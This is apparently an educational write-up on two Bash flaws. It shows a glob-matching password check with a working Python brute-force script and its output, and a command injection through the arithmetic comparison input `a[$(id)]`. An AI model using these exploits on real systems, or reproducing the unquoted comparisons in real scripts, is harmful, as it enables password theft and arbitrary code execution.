# BASH VULNERABILITIES

## 📜 PoC1 - Variable Comparison Vulnerability

```bash
#!/bin/bash
DB_USER="root"
DB_PASS="$(/usr/bin/cat /home/root/cred.txt)"

read -s -p "Enter password for $DB_USER: " USER_PASS
echo

if [[ $DB_PASS == $USER_PASS ]]; then
        echo "Password confirmed!"
else
        echo "Password confirmation failed!"
fi
```

The vulnerability here lies in the issue of variable comparison.

The correct way would be this: `"$var"` ✅

Instead of this: `$var` 🚫

### Exploit Vulnerability:

This vulnerability allows us to discover the password through brute force.

In this case, cred.txt contains the password k4l1L1nUx.

The program will interpret `[[ $DB_PASS == k4l1L1nUx ]]` the same as `[[ $DB_PASS == k* ]]`.

So through testing, we would discover the password. To automate it, we will use a Python script.

```python
import string
import subprocess
all = list(string.ascii_letters + string.digits)
password = ""
file = str(input("File name: "))
found = False

while not found:
    for character in all:
        command = f"echo '{password}{character}*' | ./{file}"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            # Remove the comment if you want me to show you the process of how it is finding the password.
            # print(password) 
            break
    else:
        found = True
        print("The password is: ", password)
```
The result upon executing the script:
```
kali@kali:~$ python3 script.py 
File name: bash_vuln
k
k4
k4l
k4l1
k4l1L
k4l1L1
k4l1L1n
k4l1L1nU
k4l1L1nUx
The password is:  k4l1L1nUx
```

---

## 📜 PoC2 - Command Injection

This is a simple script that takes an input from the user and compares it with a random number. If the user enters something like `a[$(id)]`, the id command gets executed due to Bash's expansion.

```bash
#!/bin/bash

# Generate a random number between 0 and 999
a=$((RANDOM % 1000))

# Prompt the user to enter a number
echo "Please input [$a]"
read -p "Enter number: " input_number

# Check if the entered number matches the generated one
if [[ $input_number -ne "$a" ]]; then
    echo "Incorrect number!"
    exit
else
    echo "Correct number!"
fi
```
### ⚠️ Explanation of the Vulnerability:

**Random Number Generation**: The script generates a random number and displays it as the one the user should enter.

**Command Injection**: The issue is that the input is not validated. If the user enters something like `a[$(id)]`, the id command gets executed because Bash interprets it within `[[ ... ]]` as command substitution.

### 💻 Injection Test:

If we run the script:

```bash
./vuln.sh
```
Let’s say the random number generated is **853**. The script will prompt you to enter the correct number.

Malicious Input 👾: If the attacker enters `a[$(id)]`:

    Enter number: a[$(id)]

Result: The command `id` gets executed 👨‍💻, showing information about the current user. Something like:

    Correct number!
    uid=1000(user) gid=1000(user) groups=1000(user)

📝 Conclusion:

This vulnerability occurs because the script allows command substitution inside `[[ ... ]]` without any input validation. This can lead to arbitrary code execution if an attacker provides a manipulated input containing a command substitution.
